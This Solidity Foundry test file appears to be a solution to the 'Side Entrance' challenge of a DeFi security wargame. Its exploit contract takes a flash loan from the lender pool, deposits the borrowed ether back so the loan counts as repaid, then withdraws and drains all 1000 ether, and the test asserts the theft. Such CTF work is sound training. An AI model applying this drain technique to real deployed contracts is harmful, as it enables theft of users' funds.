// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
import {IERC3156FlashBorrower, IERC3156FlashLender} from "openzeppelin/interfaces/IERC3156.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256) external;
}

contract ExploitSideEntrance {
    address pool;

    constructor(address poolAdr) {
        pool = poolAdr;
    }

    function flashLoan(uint256 amount) external {
        ISideEntranceLenderPool(pool).flashLoan(amount);
    }

    function execute() external payable {
        ISideEntranceLenderPool(pool).deposit{value: msg.value}();
    }

    function withdraw() external {
        ISideEntranceLenderPool(pool).withdraw();
    }

    receive() external payable {}
}

contract TrusterTest is Test {
    SideEntranceLenderPool pool;
    ExploitSideEntrance exploitSideEntrance;

    address owner;
    address attacker;
    uint256 TOKEN_BALANCE = 1_000_000e18; // 1 million DVT

    function setUp() public {
        owner = makeAddr("owner");
        attacker = makeAddr("attacker");

        pool = new SideEntranceLenderPool();

        vm.label(address(pool), "pool");
        vm.deal(address(pool), 1000 ether);
        vm.deal(owner, 1 ether);
    }

    function testExploitSideEntrance() public {
        exploitSideEntrance = new ExploitSideEntrance(address(pool));
        exploitSideEntrance.flashLoan(1000 ether);
        exploitSideEntrance.withdraw();

        validation();
    }

    function validation() public {
        assertEq(address(pool).balance, 0);
        assertEq(address(exploitSideEntrance).balance, 1000 ether);
    }
}
